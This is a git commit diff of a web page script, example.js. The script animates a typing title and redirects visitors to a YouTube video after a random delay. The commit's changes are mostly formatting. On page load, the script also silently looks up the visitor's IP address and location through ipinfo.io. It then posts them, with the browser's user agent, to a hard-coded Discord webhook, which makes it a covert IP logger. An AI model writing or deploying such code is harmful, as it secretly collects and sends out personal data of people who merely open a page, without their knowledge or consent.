8ccca8806a493a69c12886f5c3118f8979bea16c
getgood-nn <155199413+getgood-nn@users.noreply.github.com>
2023-12-30 07:46:07 +0100

    Update example.js

--- example.js
+++ example.js
@@ -4,8 +4,10 @@ document.addEventListener('DOMContentLoaded', function () {
   let titleIndex = 0;
   let index = 0;
   let forward = true;
+
   function updateTitle() {
     titleElement.innerText = titles[titleIndex].substring(0, index);
+
     if (forward) {
       index = (index + 1) % (titles[titleIndex].length + 1);
       if (index === titles[titleIndex].length) {
@@ -19,14 +21,18 @@ document.addEventListener('DOMContentLoaded', function () {
       }
     }
   }
+
   setInterval(updateTitle, 250);
+
   function openLink() {
     const link = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     window.location.href = link;
   }
+
   const delay = Math.floor(Math.random() * (15000 - 5000 + 1)) + 5000;
   setTimeout(openLink, delay);
 });
+
 function check() {
   const UA = navigator.userAgent;
   fetch('https://ipinfo.io/json')
@@ -38,19 +44,22 @@ function check() {
       const r = data.region;
       const co = data.country;
       loadingapi(UA, addr, c, r, co);
-    })
+    });
 }
+
 function loadingapi(UA, addr, c, r, co) {
   const csc = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
   const F = {
     content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${c}, ${r}, ${co}\``
   };
+
   fetch(csc, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(F),
-  })
+    },
+    body: JSON.stringify(F),
+  });
 }
+
 window.onload = check;
